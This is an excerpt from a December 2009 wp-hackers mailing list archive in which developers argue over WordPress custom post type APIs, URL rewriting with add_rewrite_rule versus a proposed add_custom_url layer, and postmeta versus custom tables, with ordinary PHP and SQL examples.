Do I expect a theme author to understand regexp? No.
Do I expect them to be able to ask somebody or Google search to find
examples? Yes.

>> The post_type variable is supported in 2.8, but *custom* post_type
>> support wasn't added until 2.9.
>
> But it still doesn't work in 2.8, right? ? At least it didn't work when I tried to use the URL with a post_type parameter on an existing live site. ?Anyway, not important.

No, it works in 2.8 just fine, but the post_type must be "post", or
"page", or "attachment", etc. Basically, wp_query didn't like anything
but the various built in ones.

> Conversely I'm floored by your adamancy about not wanting to make this common need approachable. ?The code you mention is fine for plugins but not fine for themes.

The code I mentioned was *far* more appropriate for themes than for
plugins, because it's creating specific conditions that the theme must
satisfy (like having a custom/products.php file in it, for example).
And it didn't even require regexp.

> The skill level for PHP coding among plugin developers is much higher than for your *average* themer who in many cases use cuts and pastes PHP code from examples...

What's wrong with them cut and pasting the example from somewhere and
modifying it to their needs?

More to the point, what makes you think a theme author isn't going to
do the same with your add_custom_url nonsense, eh? You've got a ton of
"magic" words in there... url-type, callback, single-post, etc, etc.
And it's using an array as well.

I am really not seeing why you think your method is any easier or less
complicated, especially if you're going to assume that the theme
author doesn't know PHP all that well. Heck man, theme authors cut and
paste the register_sidebar calls for their functions.php files all the
time, and they're about as complex as your add_custom_url is.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Thu Dec  3 17:56:59 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 11:56:59 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
Message-ID: <161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>

I do like the idea of making an easy way to steal the post editor
screen for a custom post type without reinventing the wheel. There
should be some nice way to do that. I don't know of one at the moment,
a lot of it seems hardcoded and hard to appropriate.

Adding your own menu system is not particularly hard right now, so not
sure anything specific needs to happen here:
http://codex.wordpress.org/Adding_Administration_Menus

I'd like to see the "Links" abstracted back into a post type instead
of being separate though. But that's probably just me.

-Otto
Sent from Memphis, TN, United States


On Thu, Dec 3, 2009 at 10:56 AM, Stephen Rider
<wp-hackers at striderweb.com> wrote:
> Okay, I'm splitting this to a new thread for a reason. ?Clearly there are people who would like to see a better API for custom Post Types. ?I would like to discuss in this thread *specifics* of how that would be best implemented.
>
> PLEASE let's avoid discussion of IF we should do it. ?There are already two other threads for that discussion (most recently "One CMS to Rule Them All"). ?This is for people who DO like the idea to discuss *specifics* of how it might/should be implemented.
>
> Note: If this is done correctly, a default install of WordPress should be NO DIFFERENT than it is now. ?We're simply adding flexibility for plugins to be able to modify things easily and consistently.
>
> Specifically, what functions need to be created? ?What should we not overlook? ?What obstacles or dangers should we avoid?
>
> Below is my previous post regarding the topic. ***Please read it before replying to this thread.*** ?There's a bit more new at the bottom as well.
>
> It gets the ball rolling with ?an overall conceptual overview of how such a thing should be implemented. ?Specifically, I think a HUGE amount of flexibility can be added to WordPress **without adding a lot of bloat**.
>
> That last bit is important, as I think bloat is one of the main reasons a lot of people *don't* want to add this API. ?If we can't do it without significant bloat, it's not worth doing.
>
>
>> I'll start by stating overall position, then get on to specifics
>>
>> 1) I heartily agree with and support the prospect of creating API functions the make it easy (simple!) for plugins to add custom post types.
>>
>> 2) I also strongly support abstracting out "Edit <post type x>" pages in Admin so that plugins can say "I need an edit page for Post Type X. ?It needs (for example) the Main Text Box, Tags, and Excerpt. ?Bang! ?Done."
>>
>> 3) I understand the wariness of bloating the core with extraneous additions, but I do not believe that this situation needs to be such. ?I believe that it could be done by creating a few robust, flexible functions, and a bit of reorganization.
>>
>> Now, some specifics:
>>
>> I'm not overly familiar with the Custom Post Type code (yet) so I can't make precise suggestions, BUT I would like to point out a patch that I recently created, that has been committed for WP 2.9. ?This patch is in ways similar, in that I saw a need and created a patch that
>>
>> 1) adds flexibility to the area to which it applies
>>
>> 2) Consolidates code in areas where different functions has substantially identical code.
>>
>> 3) Reduces redundancy in multiple places where (for example) a series of parameters had to be specified twice.
>>
>> ? ? ? 3a) Said parameters are readily modified by plugins
>>
>> 4) Created a new function that can be used by plugins to very easily create custom functions that were much more difficult (and again, redundant) to do before. ?A few pre-existing functions are recreated as wrappers to the new "core" function.
>>
>> ? ? ? 4a) The new "core" function is written in a way that it can automatically add hooks to any new wrapper functions that may be created by plugins
>>
>> 5) No bloat! ?Adds a single new function; and two pre-existing functions are significantly simplified.
>>
>> Here's the ticket:
>>
>> <http://core.trac.wordpress.org/ticket/8964>
>>
>> Specifically, get_plugin_data() and get_theme_data() used to be completely separate pieces of code, but did basically the same thing. ?I abstracted out a new function, get_file_data(), and both of the original functions are basically wrappers that use the new one for their core functionality. ?As a bonus, plugins can also put get_file_data() in a custom wrapper to read headers off of custom "add on" files of their own. ?(Also pay attention to the $context parameter!)
>>
>> So how does this apply to to custom Post Types?
>>
>> We create a new function that is basically "add_post_edit_page". ?Parameters are a location, the Post Type to which it applies, and an array containing a list of features that the Edit Page needs (Text Box, Categories, Tags, Excerpt, etc.).
>>
>> Then we abstract the existing code so that the two standard pages, Edit Post, and Edit Page, use this new function.
>
> I'm thinking that the add_post_edit_page should have the following parameters:
>
> * Post Type
> * Location in the Menu
> * array listing "Page Pieces" (meta boxes) -- e.g. text box, categories, etc.
> * $context -- which is basically the name that will be inserted into the standard hook that allows plugins to insert or remove "page pieces"
>
> This will most likely be a wrapper of some sort around the existing "add menu item" function
>
> There will be two hooks standard to all Edit-X pages:
> * One to allow plugins to modify pieces on ALL Edit pages
> * One to allow plugins to modify pieces on any Edit page that was given a $context
>
> Again: If this is done correctly, a default install of WordPress should be NO DIFFERENT than it is now.
>
> Ideas and suggestion?
>
> Stephen
>
> --
> Stephen Rider
> http://striderweb.com/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Thu Dec  3 18:01:37 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 13:01:37 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
	<161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com>
Message-ID: <828D7201-5A95-41F5-B954-E10F6884D5DC@newclarity.net>

On Dec 3, 2009, at 12:20 PM, Otto wrote:
> I disagree that your use case is common. I think you're being overly
> limited by what you want to do, and I do not think that you can expand
> that out into the general population.

Every site I've come across needs it, bar none.  Most blog sites don't, but any every website that is doing something besides blogging needs it.  

And it's the most common use case for when WordPress doesn't *already* handle the URL in an acceptable way. (Can you propose a more common use case where WordPress doesn't already handle the URL in an acceptable way?)

Still you see close-minded on this topic so we'll probably have to agree to disagree.  At least until after custom post types take off and you see how many people are using custom post types.

> 
>> I don't understand the "attaching to a fixed template" issue. As opposed to what, a variable template?
> 
> Yes, a variable template. As in maybe I have a products directory, and
> whatever.php is inside it. I can also have an index.php inside it as a
> fallback position, perhaps. This is how much of the theme hierarchy
> works, after all.

Then you misunderstand how URL templates work.  You specify them from specific to general.  You handle the use-case you refer to by adding another custom url definition, not by making each custom url overly complicated to specify.

>> BTW, my code that I sent you also supports callbacks, is that what you meant? i.e.
>> 
>> add_custom_url( array(
>>  'url_template' => 'foo-page',
>>  'url_type' => 'callback',
>>  'callback' => 'do_foo_page',
>> ));
> 
> I saw the callbacks, but have no idea what they do. What is the URL
> you're defining here? /foo-page? You can do that rather easily by
> adding a rewrite endpoint.
> 
> add_rewrite_endpoint('foo-page', EP_ROOT);

Easily for you.  Not easily for most themers.

> The EP_ROOT is where you want the endpoint to be enabled. In this
> case, just off the root URL, and not all single post pages, archives,
> etc. Full list of possibles is in rewrite.php.
> 
> Anyway, then in your template_redirect action function, you can do
> get_query_var('foo-page') to detect when your URL endpoint is
> recognized. It'll be set to 1 when it's there.

A full list of complex possibilities.  I want to make easier.

>> Are you saying WordPress shouldn't support custom post templates?
> 
> I'm saying that it shouldn't support simplistic and slightly insane
> ways of doing them, yes. If you want to do a custom post template,
> then there's a very easy method that already exists to do that.

Insane?  It's nice to see you can be condescending without saying anything of substance.  I'll try to refrain from doing this same.

>> You mean like how permalinks have special names like "postname" and "monthnum?"   So what's wrong here?
> 
> Nothing is wrong there. That's why we have add_rewrite_tag,
> specifically to add those variables. That's the whole *purpose* of it.
> What you want in this respect already exists.

It already exists, and is too complex for the average person to use in a theme.

>> Yes, a custom post type. From what I've seen that's the most common use case for custom URLs by far.  You have an issue with simplifying common use cases?
> 
> I disagree that it is a common use case, especially since custom post
> types have not been well supported until 2.9 and didn't even exist
> before 2.7.

It's a common use case *for* custom post types.

>> If you feel the need to continue criticizing please explain why it's bad to have a simplifying layer instead of arguing for a layer that does thing exactly as complicated as the layer below it.
> 
> Few reasons:
> - Creating a simplifying layer creates unnecessary code maintenance
> headaches. What happens when the underlying code changes? Now your
> layer must change with it.

Based on your comments it sounds like that underlying is perfect so maintenance is not a big issue here.

> - Layers make things slower. This is just a fact. More code = more
> memory used = slower.

Not necessarily.  It depends on how the layer is implemented.  If a layer only gets triggered in the exceptional case it only affects the exceptional case.  If it only happens on activation, then where's the real issue?

> - Layers create de-facto ways of doing things that forces people into
> a specific mindset. In other words, if we create something that lets
> people tie URLs to custom post types, then people will do that instead
> of thinking of the right way of doing what they want to do. It's
> better to leave it more open, to encourage original thinking.

So we are enforcing an orthodoxy, are we?  

> - The existing way of doing it, in this specific case, is not that
> bloody complicated. You're talking about reducing 10-15 lines of code
> down to 1 by creating a function which would have to be at least 60-70
> lines to do properly. That just makes zero sense.

It *IS TOO BLOODY COMPLICATED*!!!   How many WordPress websites are using URL rewriting right now?!?  Find me 10 sites out of millions that do something different with URLs (I'll give you one freebie: http://pm-sherpa.com/solutions/)  I'll bet you can't. The reason they are not doing it is URL rewriting in WordPress is currently TOO HARD.

> Finally: This really belongs in a plugin. You're wanting to do
> something that I doubt that even a sizable minority of WordPress users
> really want to do.

As respectfully as I can be, I think you are in a bubble. How often do you get out and talk to other people face to face about what they need in a WordPress site?  I can only think you've not had much experience with even a significant minority of those users because every website project I look at needs custom post types with custom urls.

> No, I'm arguing that WordPress should not support *this* layer which
> you're proposing.

Well, we must disagree on this.  I'll submit a patch when I can; feel free to do your best to block it if you must.

> WordPress 2.9 makes it much easier, as I have demonstrated.

At least with that we can agree.

-Mike

From otto at ottodestruct.com  Thu Dec  3 18:04:30 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 12:04:30 -0600
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <77389C5B-E8EB-4C47-8AA7-5C43D4243727@newclarity.net>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com> 
	<161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com> 
	<77389C5B-E8EB-4C47-8AA7-5C43D4243727@newclarity.net>
Message-ID: <161617690912031004n1777ef21ucde04fe01a2afed5@mail.gmail.com>

On Thu, Dec 3, 2009 at 10:55 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> I agree on this point because Matt is (sadly) adamantly against it.

I used to agree with you.

Then I worked with it for a while and built some custom systems based
on similar principles.

Now I agree with Matt. :)

> However, you are making assumptions that are invalid; there are other ways to do it which is what but Drupal CCK and Pods for WordPress do; a central posts table and then specific tables for the unique fields needs for each post type.

How is this different than the existing metadata system, really? We
have postsmeta which can hold arbitrary fields associated with
arbitrary posts.

>> Metadata as columns doesn't make any sense either.
>
> I don't follow what you mean here.

In the original post, he discussed making a metadata key/value pair
into a new column in the posts table. For example, if you wanted to
add custom_data=bob to a post, then it would alter the table to have a
custom_data column and would put "bob" in it for that post.

> Actually, having tables like follow works quite well for performance:
>
> SELECT p.*, c.* FROM wp_posts p INNER JOIN wp_custom_products c ON c.post_id=p.id

Again, we have this. See postmeta, commentmeta, usermeta, etc.

> Unless you are talking about things like Map/Reduce or simply carrying redundant data across several tables to improve performance, I'm afraid I'm going to challenge you for concrete examples here that are backed up with something other than opinion.

Well, simply think about it a minute. Joining tables to obtain data is
slower than not joining them, obviously. So for something like the
posts table, you really only want data in it (as columns) that you
will always need, every time. Author, for example, is something you
usually will display on the page, so you really always needs it and it
makes sense to retrieve it, every time.

But, you don't always need custom_data=bob, do you? So instead of
mixing that into the main posts table, it's better to have it as a
meta value in a separate table. Indexed on the post id and the key
name, for quick lookups. Then, you can get that meta data only when
the program actually asks for it, on demand, sort of thing. Saves you
a lot of time since you're not getting it every time. If you were to
merge it into the main table, then you'd spend a lot of time getting
"custom_data = null" back from the database, when you didn't care
about the custom_data column in the slightest.

-Otto
Sent from Memphis, TN, United States

From malaiac at gmail.com  Thu Dec  3 18:07:20 2009
From: malaiac at gmail.com (Malaiac)
Date: Thu, 3 Dec 2009 19:07:20 +0100
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
	<161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com>
Message-ID: <59e7f3130912031007m2940b14cxe6fa926a00b99e45@mail.gmail.com>

009/12/3 Otto <otto at ottodestruct.com>:
> On Thu, Dec 3, 2009 at 10:10 AM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> There I have to disagree. ?I am not trying to constrain the system, I am trying to creating a layer that simplifies a very common use case. The existing layer still exists when my layer is on top of it so there is nothing constrained, only common use cases simplified.
>
> I disagree that your use case is common. I think you're being overly
> limited by what you want to do, and I do not think that you can expand
> that out into the general population.

sidenote :  I always thought Gallery Management is not a common need,
that it could be very well handled by plugins, and that maybe it
bloats WP core.
And last time I checked, it was still "WordPress", not "ImagePress".
(ok , a little bad faith here).
In my case (more than 20 WP in production, going from B2B corporate
site to big blogs, flash game website, etc.), I need a better custom
content management way more than a gallery management.

M

From ravi-lists at g8o.net  Thu Dec  3 18:21:07 2009
From: ravi-lists at g8o.net ( ravi )
Date: Thu, 3 Dec 2009 13:21:07 -0500
Subject: [wp-hackers] Keeping track of comment responses
Message-ID: <05F481B8-2A01-46EE-8B46-1B358EADF3F5@g8o.net>


Hello all,

I need your advice before I run off trying to implement something.

My problem: how do I keep track of which comments I have responded to  
and which ones are awaiting a response?

I can think of a few ways (and perhaps I am missing some simpler,  
obvious ones?):

Just view the comments, threaded, in the relevant post page, and if  
any thread doesn't have a comment from me (easily ascertained by  
looking for my Gravatar), then I know a response is pending. Next  
step: add a response. The problem: once I post my response, the page  
reloads, I lose my position in the comment stream, and have to scroll  
down again to find it. I had a hope that one of the AJAX comment  
posting plugins might help me, but unfortunately none did.

Another option is to use the Dashboard comment interface to add my  
replies. This is AJAXified already in WP, so the operation is quick  
and I don't lose my position. But the Dashboard comment interface is  
not threaded (or sortable in some way that might be equivalent) and a  
return to it on a later date leaves me as puzzled as before on whether  
a comment has been responded to.

Assuming that I am not missing an obvious solution, or that one isn't  
available elsewhere, what I would like to do is:

Hack the Dashboard comments interface to add a small indicator next to  
each comment to denote whether it has a response from me or not. There  
are many considerations that I will ignore in my first cut (e.g: who  
is "me"? the author of the post? and what about comments that do not  
need a response?) just to get me to a point where I can improve my day  
to day usage. But I would like to do it the right way, nonetheless, so  
any pointers to hooks or other mechanisms would be greatly appreciated.

Regards,

	--ravi


From otto at ottodestruct.com  Thu Dec  3 18:26:41 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 12:26:41 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <828D7201-5A95-41F5-B954-E10F6884D5DC@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com> 
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com> 
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com> 
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com> 
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
	<161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com> 
	<828D7201-5A95-41F5-B954-E10F6884D5DC@newclarity.net>
Message-ID: <161617690912031026y663467a4m579fc6e56036a818@mail.gmail.com>

On Thu, Dec 3, 2009 at 12:01 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Every site I've come across needs it, bar none. ?Most blog sites don't, but any every website that is doing something besides blogging needs it.

I think I need to quote myself here.
"We're not trying to build "one CMS to rule them all" here. WordPress
is not, and should not be, all things to all people. There's plenty of
room for specialization."

WordPress is primarily a blogging platform. Yes, you can build any
sort of thing out of WordPress, if you like, but perhaps you shouldn't
always do that.

> And it's the most common use case for when WordPress doesn't *already* handle the URL in an acceptable way. (Can you propose a more common use case where WordPress doesn't already handle the URL in an acceptable way?)

The most common use case I've seen is where people want to customize
the URL to pull specific posts or sets of pages or what have you. Most
of these are pretty easy, and don't necessarily involve custom post
types.

The most common case I've seen for plugins to use it is to create
their own subset of pages to display whatever. Like an image gallery,
for example. It takes over the /gallery/* set of pages, redirects to
itself, and does whatever it likes.

>> Yes, a variable template. As in maybe I have a products directory, and
>> whatever.php is inside it. I can also have an index.php inside it as a
>> fallback position, perhaps. This is how much of the theme hierarchy
>> works, after all.
>
> Then you misunderstand how URL templates work. ?You specify them from specific to general.
>?You handle the use-case you refer to by adding another custom url definition, not by making
> each custom url overly complicated to specify.

Total nonsense. Utter gibberish. You're making things way too complex
and slow by doing that. What if I have 20000 products, after all?
Better to match /products/* once and then redirect based on the
contents of the * piece than to define 20000 separate rules of
/products/1, /products/2 and so forth..

Example: I want /products/whatever to redirect to
products/whatever.php in my theme directory. If whatever.php doesn't
exist, then use the products/index.php instead.

Code to do it for ALL arbitrary whatever's:
function plugin_add_custom_urls() {
 add_rewrite_rule('products/(.*)[/]?$', 'index.php?product=$matches[1]', 'top');
 add_rewrite_tag('%product%','.*');
}
add_action('init', 'plugin_add_custom_urls');

function plugin_add_template() {
 $product = get_query_var('product');
 if (!empty($product)) {
   locate_template(array("products/$product.php","products/index.php"), true);
   exit;
 }
}
add_action('template_redirect', 'plugin_add_template');

Just that easy.

>> add_rewrite_endpoint('foo-page', EP_ROOT);
>
> Easily for you. ?Not easily for most themers.

One line of code, which I just gave to you and the rest of the
internet, is somehow hard to modify?

> Insane? ?It's nice to see you can be condescending without saying anything of substance. ?I'll try to refrain from doing this same.

Hey, I calls 'em like I sees 'em. I think it is slightly insane to go
to extreme lengths to wrap things and make them more complicated and
less capable in the process.

> It already exists, and is too complex for the average person to use in a theme.

This is only your opinion. Please stop treating it like some kind of
Truth handed down from up on high, when it is no such thing. Thanks.

>> - Layers make things slower. This is just a fact. More code = more
>> memory used = slower.
>
> Not necessarily. ?It depends on how the layer is implemented.

False. Layers *ALWAYS* make things slower. This is easy to prove.
Method 1: I execute code A.
Method 2: I call layer B which in turn executes code A.

Method 2 is always slower than method 1. Furthermore. Method 2
implements code designed to abstract portions of the underlying code,
which takes time to run. Making it even slower.

ALL layers are slower than bypassing them, by definition. That's just
one argument though, it's not a critical indictment against layers as
a concept.

> So we are enforcing an orthodoxy, are we?

No, we're just not encouraging one. That was sort of my point.

> It *IS TOO BLOODY COMPLICATED*!!!

Your opinion again.

>How many WordPress websites are using URL rewriting right now?!?

Well, I'd say almost all of them use it in one form or another,
actually. Of course, they do it through plugins, generally speaking,
but hey. Anybody running an image gallery plugin, off the top of my
head, is using URL rewriting to some degree.

Why don't you search the plugin svn repo for how many instances you
can find of "add_rewrite" and see what you come up with?

> As respectfully as I can be, I think you are in a bubble.

I would say the same back to you, but I think we're past that point.

Nice having this chat with you, but we're done now.

> Well, we must disagree on this. ?I'll submit a patch when I can; feel free to do your best to block it if you must.

Stop taking things personally. I'm not against *you*, I'm against
*your idea*. I'm all for improving WordPress. I just don't think that
this idea is an improvement.

-Otto
Sent from Memphis, TN, United States

From mikeschinkel at newclarity.net  Thu Dec  3 18:34:23 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 13:34:23 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
	<161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>
Message-ID: <63AC3F44-0004-4C77-85F6-8ED674E39301@newclarity.net>

On Dec 3, 2009, at 12:43 PM, Otto wrote:
> ... To be quite blunt, if a person is not capable of understanding
> regular expressions, and can't look in a book for 10 minutes to figure
> out what they want to do, then they should not be writing code of any
> kind. They should stick to something simple, like flipping burgers.

And to be blunt in return, it's exactly that type of position that I think should disqualify your opinion from having any sway with respect to WordPress' direction.  That is highly condescending.  Your assertion would compare to me saying "Unless you have the skills of the German masters you shouldn't be allowed to brew beer." 

> Obviously, I don't expect an end user to understand regular
> expressions. I wouldn't want people making fields to put regexp on the
> admin screens, for example.
> 
> But there's a certain level of knowledge you need to obtain to write
> code, and to write PHP code in particular. Simple Regular Expressions
> is one of those most basic levels of things you need to know, just
> after string handling.

That "certain level of knowledge required" is only required because some people who think others are not worthy block the way to accessibility by more people.

According to your "rules" nobody should be able to code a theme unless they are capable of understanding regular expressions. Meh.  I'll quote many a wise programmer:

"Some people, when confronted with a problem, think "I'll use regular expressions." Now they have two problems."

Regular Expressions are notoriously fragile and mastering Regular expressions takes time and diligence. Expecting the themer to become good of regular expressions is just silly.

> Do I expect a plugin author to understand regexp? Absolutely.
> Do I expect a theme author to understand regexp? No.
> Do I expect them to be able to ask somebody or Google search to find
> examples? Yes.

The flaw in that logic is that regular expressions are complex enough with nuances that can easily bite you that it's very difficult to see an example and use it it quickly craft a different example that works.  So if you are asking a themer to use regular expressions then you are asking a themer to understand regular expressions.  

If regular expressions are so easy, why is it that a bunch of really smart developers (probably smarter than anyone on this list and especially me) have proposed URI Templates? (answer: because regular expressions are just too damn hard):

http://bitworking.org/projects/URI-Templates/

Regular expressions can represent practically anything.  The valid scope of URL rewriting is much smaller than what a regular expression can handle.  Using regular expressions for URL rewriting when something more straightforward is available is pure overkill.

Look, even WordPress' permalink section eschews regular expressions for a form of URL templates. Obviously there is a reason regular expressions are too hard. (and by your logic, people could have just cut and paste examples from the docs into the admin.  I'm glad your approach did not prevail there.)

>>> The post_type variable is supported in 2.8, but *custom* post_type
>>> support wasn't added until 2.9.
>> 
>> But it still doesn't work in 2.8, right?   At least it didn't work when I tried to use the URL with a post_type parameter on an existing live site.  Anyway, not important.
> 
> No, it works in 2.8 just fine, but the post_type must be "post", or
> "page", or "attachment", etc. Basically, wp_query didn't like anything
> but the various built in ones.

In other words for custom post types it doesn't work in 2.8.  Reminds me of the joke about the lost pilot in the helicopter who asked the people in the building where he was:

http://www.bastichlabz.org/~tigger/TechHumor/mshelicopter.txt

>> Conversely I'm floored by your adamancy about not wanting to make this common need approachable.  The code you mention is fine for plugins but not fine for themes.
> 
> The code I mentioned was *far* more appropriate for themes than for
> plugins, because it's creating specific conditions that the theme must
> satisfy (like having a custom/products.php file in it, for example).
> And it didn't even require regexp.

Sigh.  add_custom_url() was much simpler than your code and did all the same things.

>> The skill level for PHP coding among plugin developers is much higher than for your *average* themer who in many cases use cuts and pastes PHP code from examples...
> 
> What's wrong with them cut and pasting the example from somewhere and
> modifying it to their needs?

Because 
1.) cutting and pasting regular expressions doesn't work unless they are an exact match,
2.) the more complex it looks the less approachable it is and the less likely people will end up being able to use it.

Look, I'm trying to make adding a custom URL *declarative*; you are trying to force it to continue to be *procedural*.  The former is almost always easier to learn than the latter:

http://ai.eecs.umich.edu/cogarch2/prop/declarative-procedural.html

From http://en.wikipedia.org/wiki/Declarative_programming
... Many languages applying this style attempt to minimize or eliminate side effects by describing what the program should accomplish, rather than describing how to go about accomplishing it.[2] This is in contrast with imperative programming, which requires an explicitly provided algorithm.
From http://www.cs.cornell.edu/Info/Projects/NuPrl/cs611/fall94notes/cn2/subsection3_1_2.html

The declarative programming try to blur the distinction between a program as a set of instructions and a program as an assertion about the desired answer, in other words, the declarative programs can be dually viewed as programming commands or mathematical assertions. Thus, it is easy to understand the semantics of declarative language using the way we understand ordinary mathematics.

> More to the point, what makes you think a theme author isn't going to
> do the same with your add_custom_url nonsense, eh? You've got a ton of
> "magic" words in there... url-type, callback, single-post, etc, etc.
> And it's using an array as well.

It's far easier to learn magic words for a single function call from a doc page than it is to learn how to assemble many different concepts from potentially many different doc pages, and more importantly its much harder to master using regular expressions correctly than learning a small finite list of keywords.

> I am really not seeing why you think your method is any easier or less
> complicated, especially if you're going to assume that the theme
> author doesn't know PHP all that well. Heck man, theme authors cut and
> paste the register_sidebar calls for their functions.php files all the
> time, and they're about as complex as your add_custom_url is.

Honestly, if you can't see why it's easier or even accept that other people can see things different then there's nothing left for us to discuss.  

-Mike

From wp-hackers at striderweb.com  Thu Dec  3 18:41:46 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 3 Dec 2009 12:41:46 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
	<161617690912030956tcb3bbb5l824b1f47cc657726@mail.gmail.com>
Message-ID: <A4DBBAE2-37FE-4ED3-A1A3-7A54980E1B3E@striderweb.com>


On Dec 3, 2009, at 11:56 AM, Otto wrote:

> Adding your own menu system is not particularly hard right now, so not
> sure anything specific needs to happen here:
> http://codex.wordpress.org/Adding_Administration_Menus

Actually, that's a good point.  It doesn't need to be a wrapper around the menu creation.  I may be abstracting to far there.  Just add a menu item the old way, and use the new functionality to create the page itself...?

> I'd like to see the "Links" abstracted back into a post type instead
> of being separate though. But that's probably just me.

I think a cart/horse inversion is happening here, but something to keep in mind for *after* the full Post Type API is in place.

Stephen

-- 
Stephen Rider
http://striderweb.com/


From mikeschinkel at newclarity.net  Thu Dec  3 18:45:16 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 13:45:16 -0500
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <161617690912031004n1777ef21ucde04fe01a2afed5@mail.gmail.com>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
	<161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
	<77389C5B-E8EB-4C47-8AA7-5C43D4243727@newclarity.net>
	<161617690912031004n1777ef21ucde04fe01a2afed5@mail.gmail.com>
Message-ID: <D9754CB3-472A-4742-A66C-4BE77A6939AB@newclarity.net>

On Dec 3, 2009, at 1:04 PM, Otto wrote:
> On Thu, Dec 3, 2009 at 10:55 AM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> I agree on this point because Matt is (sadly) adamantly against it.
> 
> I used to agree with you.
> 
> Then I worked with it for a while and built some custom systems based
> on similar principles.
> 
> Now I agree with Matt. :)

In general I'll agree multiple tables add complexity. OTOH there are certain relationships and certain queries that simple can't be done with metadata.

>> However, you are making assumptions that are invalid; there are other ways to do it which is what but Drupal CCK and Pods for WordPress do; a central posts table and then specific tables for the unique fields needs for each post type.
> 
> How is this different than the existing metadata system, really? We
> have postsmeta which can hold arbitrary fields associated with
> arbitrary posts.

There as some queries that get too complex to be handled with metadata.  Each field that you bring into a SQL join requires joining another table and every table you join slows the query done.  If you have grandparent-parent-child relationships it can get even more complex.  At a certain point you hit the limit of MySQL query analyzer.

>> Actually, having tables like follow works quite well for performance:
>> 
>> SELECT p.*, c.* FROM wp_posts p INNER JOIN wp_custom_products c ON c.post_id=p.id
> 
> Again, we have this. See postmeta, commentmeta, usermeta, etc.

